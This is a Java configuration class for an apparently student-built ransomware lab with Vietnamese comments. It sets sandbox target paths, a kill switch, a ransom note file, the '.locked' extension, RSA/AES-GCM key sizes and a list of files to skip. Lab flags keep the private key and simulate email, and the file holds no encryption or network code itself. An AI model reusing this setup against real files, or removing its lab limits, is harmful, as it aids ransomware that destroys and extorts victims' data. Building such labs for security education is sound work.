package ransomware;

/**
 * Cấu hình cho Ransomware Lab
 *
 * ⚠️ CHỈ CHẠY TRONG LAB CÔ LẬP
 */
public final class Config {

    private Config() {}

    // ============================================================
    // ĐƯỜNG DẪN
    // ============================================================

    /** Thư mục target - CHỈ mã hóa trong đây */
    public static final String TARGET_DIR = "D:\\Bài tập lớn Cơ sở an toàn thông tin\\Lab_sandbox\\working\\";

    /** Thư mục chứa key */
    public static final String KEY_DIR = "D:\\Bài tập lớn Cơ sở an toàn thông tin\\Lab_sandbox\\manifest\\keys\\";

    /** File kill switch */
    public static final String KILL_SWITCH = "D:\\Bài tập lớn Cơ sở an toàn thông tin\\Lab_sandbox\\STOP.txt";

    /** File log */
    public static final String LOG_FILE = "D:\\Bài tập lớn Cơ sở an toàn thông tin\\Lab_sandbox\\manifest\\ransomware.log";

    /** File ransom note */
    public static final String RANSOM_NOTE = "D:\\Bài tập lớn Cơ sở an toàn thông tin\\Lab_sandbox\\working\\README_RANSOM.txt";

    // ============================================================
    // CRYPTO
    // ============================================================

    public static final String ENCRYPTED_EXT = ".locked";
    public static final int RSA_KEY_SIZE = 4096;
    public static final int AES_KEY_SIZE = 256;
    public static final int IV_SIZE = 12;
    public static final int TAG_BITS = 128;

    // ============================================================
    // LAB MODE
    // ============================================================

    public static final boolean SIMULATE_EMAIL = true;
    public static final boolean DELETE_PRIVATE_KEY = false;

    // ============================================================
    // LOẠI TRỪ
    // ============================================================

    private static final String[] EXCLUDED_FILES = {
            "public.key", "private.key", "ransomware.log",
            "readme_ransom.txt", "stop.txt", "desktop.ini", "thumbs.db"
    };

    private static final String[] EXCLUDED_EXTENSIONS = {
            ".locked", ".key", ".log", ".exe", ".dll", ".sys"
    };

    public static boolean shouldSkip(String fileName) {
        String lower = fileName.toLowerCase();

        for (String f : EXCLUDED_FILES) {
            if (lower.equals(f)) return true;
        }

        for (String e : EXCLUDED_EXTENSIONS) {
            if (lower.endsWith(e)) return true;
        }

        return false;
    }
}